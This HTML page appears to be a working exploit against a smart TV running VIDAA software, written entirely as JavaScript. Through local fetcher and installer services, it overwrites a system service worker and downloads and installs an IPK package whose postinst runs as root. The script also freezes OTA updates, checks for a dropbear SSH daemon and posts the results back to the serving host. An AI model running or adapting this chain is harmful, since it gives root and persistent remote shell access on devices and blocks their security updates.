<!doctype html>
<!-- Phase-3 ARMING page for 55E7QTUK (owner-approved 2026-11-08):
     update forwarder sw2.js, place installer.ipk (both via fetcher, own
     origin), then trigger the superwatch socket:
       <sid>:54:<sid>;re.installer        (uninstall if present; 604 = fine)
       <sid>:53:<sid>;/APPS/installer.ipk;re.installer;   (install → postinst root)
     Polls /APPS/.re_sshd/installer_log.txt and ../tmp/ipk_install_result.
     OTA freeze runs FIRST inside the postinst (built into the IPK).
     Teardown: the same uninstall command, plus rm -rf /APPS/.re_sshd. -->
<html><head><meta charset="utf-8"><title>arm</title></head>
<body><pre id="out">arm…</pre><script>
(function () {
  "use strict";
  var out = document.getElementById("out");
  var report = { started: new Date().toISOString(), steps: {} };
  function save() { try { var x = new XMLHttpRequest(); x.open("POST", "/api/probe", true); x.setRequestHeader("Content-Type", "application/json"); x.send(JSON.stringify(report)); } catch (e) {} }
  function line(t) { out.textContent = out.textContent + "\n" + t; }
  function norm(m) { if (m == null) return ""; if (typeof m === "string") return m; try { return JSON.stringify(m); } catch (e) { return String(m); } }
  var BASE = location.origin + "/pub/";
  var FN_TARGET = "/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js";
  var FN_URL = "http://localhost:9009/function/basic/fetch/sw2";

  function startFetcher() {
    return new Promise(function (res) {
      var done = false; function fin(v) { if (!done) { done = true; res(v); } }
      try {
        var ws = new WebSocket("wss://localhost:9888");
        ws.onopen = function () {
          ws.send(JSON.stringify({ path: "phoenix://service/basic/fetcher", method: "start",
                                   parameters: {}, session: 901, timeout: 10 }));
          setTimeout(function () { try { ws.close(); } catch (e) {} fin("ok"); }, 1200);
        };
        ws.onerror = function () { fin("ws error"); };
        setTimeout(function () { fin("timeout"); }, 5000);
      } catch (e) { fin("EXC " + e.message); }
    });
  }
  function fetchTo(url, target) {
    var args = JSON.stringify({ url: url, directory: target, permission: 420 });
    try { var r = vowOS.service.syncExecute("basic/fetcher", { api: "fetchFile", args: args }); return { ret: r && r.ret, msg: norm(r && r.msg).slice(0, 120) }; }
    catch (e) { return { ret: false, msg: "EXC " + e.message }; }
  }
  function hr(path) {
    try {
      var r = vowOS.service.syncExecute("hiutils", { api: "fileRead", args: { mode: 6, path: [path] } });
      var okc = r && r.ret === true;
      return { ok: okc, body: okc ? norm(r.msg).slice(0, 6000) : null,
               err: okc ? null : norm(r.msg).slice(0, 160) };
    } catch (e) { return { ok: false, err: "EXC " + e }; }
  }

  setTimeout(function () {
    startFetcher().then(function (s0) {
      report.steps.start = s0; line("fetcher: " + s0);
      setTimeout(function () {
        report.steps.sw2 = fetchTo(BASE + "sw2.js", FN_TARGET);
        line("sw2.js: " + JSON.stringify(report.steps.sw2));
        setTimeout(function () {
          report.steps.ipk = fetchTo(BASE + "installer.ipk", "/APPS/installer.ipk");
          line("installer.ipk: " + JSON.stringify(report.steps.ipk));
          setTimeout(function () {
            var sid1 = 50, sid2 = 51;
            var list = [
              sid1 + ":54:" + sid1 + ";re.installer",
              sid2 + ":53:" + sid2 + ";/APPS/installer.ipk;re.installer;"
            ];
            var x = new XMLHttpRequest();
            x.open("POST", FN_URL, true);
            x.setRequestHeader("Content-Type", "application/json");
            x.onload = function () { report.steps.trigger = { status: x.status, text: String(x.responseText || "").slice(0, 900) }; line("trigger: " + report.steps.trigger.status + " " + report.steps.trigger.text.slice(0, 500)); poll(0); };
            x.onerror = function () { report.steps.trigger = { status: 0 }; line("trigger XHR error"); poll(0); };
            try { x.send(JSON.stringify({ list: list })); } catch (e) { line("trigger EXC " + e.message); poll(0); }
            var READS = [".re_sshd/installer_log.txt",
                         ".re_sshd/dropbear.pid",
                         "../tmp/ipk_install_result"];
            function poll(n) {
              if (n > 9) { line("poll exhausted"); save(); return; }
              setTimeout(function () {
                var logp = hr(READS[0]);
                report.steps["log_try" + n] = logp;
                if (logp.ok) { line("installer_log (" + n + "): ok — see report"); save(); return; }
                var rf = hr(READS[2]);
                report.steps["result_try" + n] = rf;
                line("poll " + n + ": log absent; ipk_install_result=" + (rf.ok ? String(rf.body).slice(0, 160) : "absent"));
                if (rf.ok && String(rf.body).indexOf("code") !== -1) { line("install FAILED per result file"); save(); return; }
                poll(n + 1);
              }, 4000);
            }
          }, 1600);
        }, 1600);
      }, 1600);
    });
  }, 300);
})();
</script></body></html>
